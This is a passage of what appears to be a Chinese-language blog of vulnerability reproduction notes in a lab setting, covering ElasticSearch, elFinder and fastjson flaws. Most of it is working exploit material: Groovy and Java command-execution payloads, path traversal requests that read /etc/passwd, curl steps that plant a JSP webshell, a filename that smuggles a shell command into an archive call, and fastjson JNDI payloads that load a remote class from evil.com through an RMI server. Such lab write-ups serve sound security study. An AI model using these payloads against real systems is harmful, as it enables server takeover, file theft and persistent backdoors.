class="line">Content-Length: 343</span><br><span class="line">&#123;</span><br><span class="line">&quot;size&quot;: 1,</span><br><span class="line">&quot;query&quot;: &#123;</span><br><span class="line">&quot;filtered&quot;: &#123;</span><br><span class="line">&quot;query&quot;: &#123;</span><br><span class="line">&quot;match\_all&quot;: &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;script\_fields&quot;: &#123;</span><br><span class="line">&quot;command&quot;: &#123;</span><br><span class="line">&quot;script&quot;: &quot;import java.io.\*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如图：</p></blockquote><p><img src="98.jpg" alt="98"></p><h1 id="ElasticSearch-Groovy-沙盒绕过-代码执行漏洞（CVE-2015-1427）测试环境"><a href="#ElasticSearch-Groovy-沙盒绕过-代码执行漏洞（CVE-2015-1427）测试环境" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）测试环境"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.4.2</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>参考文章：</p><ul><li><a href="http://cb.drops.wiki/drops/papers-5107.html">http://cb.drops.wiki/drops/papers-5107.html</a></li><li><a href="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</a></li><li><a href="https://github.com/XiphosResearch/exploits">https://github.com/XiphosResearch/exploits</a></li><li><a href="http://cb.drops.wiki/drops/papers-5142.html">http://cb.drops.wiki/drops/papers-5142.html</a></li></ul><p>CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。</p><h2 id="Groovy语言“沙盒”"><a href="#Groovy语言“沙盒”" class="headerlink" title="Groovy语言“沙盒”"></a>Groovy语言“沙盒”</h2><p>ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：</p><ol><li>既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射</li><li>Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言</li></ol><p>所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。</p><p>Java沙盒绕过法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;id&quot;).getText()</span><br></pre></td></tr></table></figure><p>Goovy直接执行命令法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def command=&#x27;id&#x27;;def res=command.execute().text;res</span><br></pre></td></tr></table></figure></blockquote><h2 id="漏洞复现-46"><a href="#漏洞复现-46" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="99.jpg" alt="99"></p><blockquote><p>然后发送包含payload的数据包，执行任意命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /\_search?pretty HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/text</span><br><span class="line">Content-Length: 156</span><br><span class="line">&#123;&quot;size&quot;:1, &quot;script\_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="100.jpg" alt="100"></p><h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-3337）测试环境"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-3337）测试环境" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境"></a>ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.4.4</p><p>影响版本：1.4.5以下&#x2F;1.5.2以下</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>在安装了具有“site”功能的插件以后，插件目录使用<code>../</code>即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。</p></blockquote><h2 id="漏洞复现-47"><a href="#漏洞复现-47" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>测试环境默认安装了一个插件：<code>elasticsearch-head</code>，主页在此：<a href="https://github.com/mobz/elasticsearch-head">https://github.com/mobz/elasticsearch-head</a></p><p>访问<code>http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd</code>读取任意文件（不要在浏览器访问）：</p></blockquote><p><img src="101.jpg" alt="101"></p><h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-5531）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.6.0</p><p>影响版本：1.6.1以下</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>参考文章</p><ul><li><a href="https://www.exploit-db.com/exploits/38383/">https://www.exploit-db.com/exploits/38383/</a></li><li><a href="http://www.freebuf.com/vuls/99942.html">http://www.freebuf.com/vuls/99942.html</a></li></ul><p>说明：</p><p>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在<code>path.repo</code>，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。</p></blockquote><h2 id="漏洞复现-48"><a href="#漏洞复现-48" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><h3 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT /\_snapshot/test HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 108</span><br><span class="line">&#123;</span><br><span class="line">&quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">&quot;settings&quot;: &#123;</span><br><span class="line">&quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="102.jpg" alt="102"></p><blockquote><h3 id="2-创建一个快照"><a href="#2-创建一个快照" class="headerlink" title="2. 创建一个快照"></a>2. 创建一个快照</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT /\_snapshot/test2 HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 108</span><br><span class="line">&#123;</span><br><span class="line">&quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">&quot;settings&quot;: &#123;</span><br><span class="line">&quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="103.jpg" alt="103"></p><blockquote><h3 id="3-目录穿越读取任意文件"><a href="#3-目录穿越读取任意文件" class="headerlink" title="3. 目录穿越读取任意文件"></a>3. 目录穿越读取任意文件</h3><p>访问 <code>http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code></p></blockquote><p><img src="104.jpg" alt="104"></p><blockquote><p>如上图，在错误信息中包含文件内容（编码后），对其进行解码即可获得文件：</p></blockquote><p><img src="105.jpg" alt="105"></p><h1 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h1><blockquote><p>参考文章： <a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a></p><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。</p><p>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p><p>和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项<code>path.repo</code>中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。</p></blockquote><h2 id="漏洞复现-49"><a href="#漏洞复现-49" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先创建一个恶意索引文档：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d&#x27;</span><br><span class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure><p>再创建一个恶意的存储库，其中<code>location</code>的值即为我要写入的路径。</p><blockquote><p>园长：这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT &#x27;http://127.0.0.1:9200/\_snapshot/yz.jsp&#x27; -d &#x27;&#123;</span><br><span class="line">&quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">&quot;settings&quot;: &#123;</span><br><span class="line">&quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot/&quot;,</span><br><span class="line">&quot;compress&quot;: false</span><br><span class="line">&#125;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure><p>存储库验证并创建:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT &quot;http://127.0.0.1:9200/\_snapshot/yz.jsp/yz.jsp&quot; -d &#x27;&#123;</span><br><span class="line">&quot;indices&quot;: &quot;yz.jsp&quot;,</span><br><span class="line">&quot;ignore\_unavailable&quot;: &quot;true&quot;,</span><br><span class="line">&quot;include\_global\_state&quot;: false</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure><p>完成！</p><p>访问<code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code>，这就是我们写入的webshell。</p><p>该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：<code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>，我们再访问&#x2F;wwwroot&#x2F;test.jsp就能看到success了：</p></blockquote><p><img src="106.jpg" alt="106"></p><p><img src="107.jpg" alt="107"></p><h1 id="Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）（未完成）"><a href="#Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）（未完成）" class="headerlink" title="Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）（未完成）"></a>Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）（未完成）</h1><blockquote><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。</p><p>Electron在设置了<code>nodeIntegration=false</code>的情况下（默认），页面中的JavaScript无法访问node.js的内置库。CVE-2018-15685绕过了该限制，导致在用户可执行JavaScript的情况下（如访问第三方页面或APP存在XSS漏洞时），能够执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://electronjs.org/blog/web-preferences-fix">https://electronjs.org/blog/web-preferences-fix</a></li><li><a href="https://www.contrastsecurity.com/security-influencers/cve-2018-15685">https://www.contrastsecurity.com/security-influencers/cve-2018-15685</a></li></ul></blockquote><p>报错 .sh无法执行</p><h1 id="electron-远程命令执行漏洞（CVE-2018-1000006）（未完成）"><a href="#electron-远程命令执行漏洞（CVE-2018-1000006）（未完成）" class="headerlink" title="electron 远程命令执行漏洞（CVE-2018-1000006）（未完成）"></a>electron 远程命令执行漏洞（CVE-2018-1000006）（未完成）</h1><p>同上</p><h1 id="elFinder-ZIP-参数与任意命令注入（CVE-2021-32682）"><a href="#elFinder-ZIP-参数与任意命令注入（CVE-2021-32682）" class="headerlink" title="elFinder ZIP 参数与任意命令注入（CVE-2021-32682）"></a>elFinder ZIP 参数与任意命令注入（CVE-2021-32682）</h1><p>elFinder是一个基于PHP、Jquery的开源文件管理系统。</p><p>在elFinder 2.1.48及以前的版本中，存在一处参数注入漏洞。攻击者可以利用这个漏洞在目标服务器上执行任意命令，即使是最小化安装的elFinder。</p><p>这个漏洞的原因除了参数注入外，还有默认情况下的未授权访问，因此我们可以对elFinder增加权限校验，避免任意用户操作服务器上的文件，进而避免被执行任意命令。当然，升级版本到2.1.49及以上也是必要的。</p><p>参考链接：</p><ul><li><a href="https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities">https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities</a></li><li><a href="https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt">https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt</a></li><li><a href="https://xz.aliyun.com/t/10739">https://xz.aliyun.com/t/10739</a></li></ul><h2 id="漏洞复现-50"><a href="#漏洞复现-50" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>复现这个漏洞首先需要用elFinder提供的功能，创建两个文件。</p><p>先创建一个普通的文本文件<code>1.txt</code>：</p><p>然后右键这个文件，对其进行打包，打包后的文件命名为<code>2.zip</code>：</p><p>最后我们获得<code>1.txt</code>和<code>2.zip</code>两个文件：</p></blockquote><p><img src="108.jpg" alt="108"></p><blockquote><p>然后，发送如下数据包来执行任意命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /php/connector.minimal.php?cmd=archive&amp;name=-TvTT=id&gt;shell.php%20%23%20a.zip&amp;target=l1\_Lw&amp;targets%5B1%5D=l1\_Mi56aXA&amp;targets%5B0%5D=l1\_MS50eHQ&amp;type=application%2Fzip HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: application/json, text/javascript, \*/\*; q=0.01</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://localhost.lan:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>这个数据包中，你可以看到三个重要的参数：</p><ul><li><code>name</code>， 值为<code>-TvTT=id&gt;shell.php # a.zip</code>，你可以修改<code>id&gt;shell.php</code>为任意你想执行的命令</li><li><code>targets[0]</code>， 值为<code>l1_MS50eHQ</code>，<code>l1</code>意思是第一个文件系统（默认值，不用修改），<code>MS50eHQ</code>是<code>1.txt</code>的base64编码</li><li><code>targets[1]</code>， 值为<code>l1_Mi56aXA</code>，<code>l1</code>意思是第一个文件系统（默认值，不用修改），<code>Mi56aXA</code>是<code>2.zip</code>的base64编码</li></ul><p>虽然这个数据包发送后会返回错误信息，但实际上其中指定的命令已经被成功执行</p></blockquote><p><img src="109.jpg" alt="109"></p><blockquote><p>可以访问<code>http://your-ip:8080/files/shell.php</code>查看执行的结果：</p></blockquote><p><img src="110.jpg" alt="110"></p><h1 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><blockquote><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p>参考资料：</p><ul><li><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></li><li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li></ul></blockquote><h2 id="漏洞复现-51"><a href="#漏洞复现-51" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p><p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://evil.com/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure><p>向靶场服务器发送Payload，带上RMI的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 160</span><br><span class="line">&#123;</span><br><span class="line">&quot;b&quot;:&#123;</span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">&quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/TouchFile&quot;,</span><br><span class="line">&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，命令<code>touch /tmp/success</code>已成功执行：</p></blockquote><p>我参考了<a href="https://blog.csdn.net/BrickLoveStudy/article/details/124362374">这个教程</a></p><p><img src="112.jpg" alt="112"></p><p><img src="113.jpg" alt="113"></p><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><blockquote><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li><li><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></li></ul></blockquote><h2 id="漏洞复现-52"><a href="#漏洞复现-52" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>和上面那个过程完全一样啊 就不再搞一遍了</p><blockquote><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p><p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://evil.com/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure><p>向靶场服务器发送Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&#123;</span><br><span class="line">&quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;b&quot;:&#123;</span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">&quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/Exploit&quot;,</span><br><span class="line">&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，命令<code>touch /tmp/success</code>已成功执行：</p></blockquote><h1 id="ffmpeg-任意文件读取漏洞-SSRF漏洞-（CVE-2016-1897-CVE-2016-1898）"><a 